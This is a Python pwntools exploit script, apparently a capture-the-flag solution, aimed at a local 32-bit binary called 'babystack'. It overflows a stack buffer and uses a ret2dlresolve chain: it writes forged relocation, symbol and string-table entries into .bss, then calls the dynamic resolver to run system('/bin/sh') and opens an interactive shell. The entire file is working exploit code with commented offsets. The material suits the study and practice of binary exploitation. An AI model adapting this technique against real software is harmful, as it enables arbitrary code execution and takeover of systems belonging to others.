import pwn as p

target = p.process('./babystack')
p.gdb.attach(target, gdbscript='b *0x0804844c')
elf = p.ELF('babystack')


read_input_addr = 0x804843b
bss_addr = 0x804a020
dynsym_addr = 0x80481cc
dynstr_addr = 0x804822c
relplt_addr = 0x80482b0
resolver_addr = 0x80482f0

entries_payload_size = 43  # it's printed below

# first write what we want to .bss
double_read_payload = b'\x30' * 44  # padding
double_read_payload += p.p32(elf.symbols['read'])  # return to read
double_read_payload += p.p32(read_input_addr)  # next return address: after the read get back to the read_input method
double_read_payload += p.p32(0)  # stdin
double_read_payload += p.p32(bss_addr)  # where to write
double_read_payload += p.p32(entries_payload_size)  # how much we write

target.send(double_read_payload)


# then we send the entries

# r_info value
# `// 0x10`: because each entry is 16 bytes long, e.g. 0x10 bytes
# the 0xc corresponds to the delta to get to the dynsym entry
dynsym_offset = ((bss_addr + 0xc) - dynsym_addr) // 0x10
r_info = (dynsym_offset << 8) | 0x7

print('r_info', hex(r_info))

# 28 is the offset to get to the "system" string
dynstr_index = (bss_addr + 28) - dynstr_addr

entries_payload = b''
# .rel.plt entry
entries_payload += p.p32(elf.got['alarm'])
entries_payload += p.p32(r_info)

entries_payload += p.p32(0x0)

# .dynsym entry
entries_payload += p.p32(dynstr_index)
entries_payload += p.p32(0xde) * 3

# .dynstr entry
entries_payload += bytes('system\x00', 'utf8')

# also store the string that will be used for the system call
binsh_address = bss_addr + len(entries_payload)  # for later use
entries_payload += bytes('/bin/sh\x00', 'utf8')

print(f'entries_payload\'s size: {len(entries_payload)}')

target.send(entries_payload)


# Last scan, we call the resolver so it will stumble upon our crafted entries

# compute the .rel.plt offset
retplt_offset = bss_addr - relplt_addr

resolver_payload = b'\x30' * 44
resolver_payload += p.p32(resolver_addr)
resolver_payload += p.p32(retplt_offset)  # I guess the resolver works on delta relative to retplt
resolver_payload += p.p32(0xdeadbeef)  # next return address which does not matter for us
resolver_payload += p.p32(binsh_address)

target.send(resolver_payload)

target.interactive()
